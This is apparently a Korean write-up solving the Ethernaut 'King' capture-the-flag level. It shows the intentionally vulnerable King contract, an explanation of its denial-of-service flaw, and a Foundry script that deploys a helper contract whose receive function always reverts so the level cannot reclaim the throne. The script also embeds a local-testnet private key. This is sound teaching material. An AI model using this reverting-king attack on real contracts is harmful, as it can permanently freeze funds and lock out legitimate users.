# 지문

아래의 컨트랙트는 **아주 단순한 게임**을 나타냅니다. 현재 상금보다 더 많은 이더(ether)를 보내는 사람이 새로운 왕이 됩니다. 이때, 쫓겨난 이전 왕은 새 상금만큼의 이더를 받아서 약간의 수익을 얻게 되죠. 정말 전형적인 **폰지 구조**네요 xD

꽤 재미있는 게임이죠. 하지만 **당신의 목표는 이 게임을 깨는 것**입니다.

인스턴스를 레벨에 제출하면, 레벨이 다시 왕의 지위를 되찾으려고 시도할 것입니다. 이때 **그러한 자동 왕위 회수를 방지할 수 있다면** 이 레벨을 클리어하게 됩니다.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

# 풀이 

코드는 별게없다만, 답안을 제출하면 다른 주소가 owner를 다시 가져가도록 되어있음 
여기서 주목할건 `payable(king).transfer(msg.value);`임.
이전 `king`에게 contract에 있는 native token을 다보내고 ownership을 전송함.

근데 여기서 이전 `king`이 contract이고 receive handler에 항상 revert가 되도록 만들어둔다면 항상 함수 호출이 실패할수밖에 없음.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function _king() external view returns (address);
    function prize() external view returns (uint256);
    function owner() external view returns (address);
}

contract Helper {
    function trigger(address target) public payable {
        target.call{value:1000000000000000}("");
        console.log("current king : %s", ITarget(target)._king());
        console.log("current prize : %d", ITarget(target).prize());
    }

    receive() external payable {
        revert("HELLLLLLO");
    }
}
contract SolveScript is Script {
    address public target = 0x3B02fF1e626Ed7a8fd6eC5299e2C54e1421B626B;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();


        console.log("current king : %s", ITarget(target)._king());
        console.log("current prize : %d", ITarget(target).prize());

        Helper helper = new Helper();
        console.log("helper address : %s", address(helper));
        helper.trigger{value:1000000000000000}(target);

        vm.stopBroadcast();
    }
}
```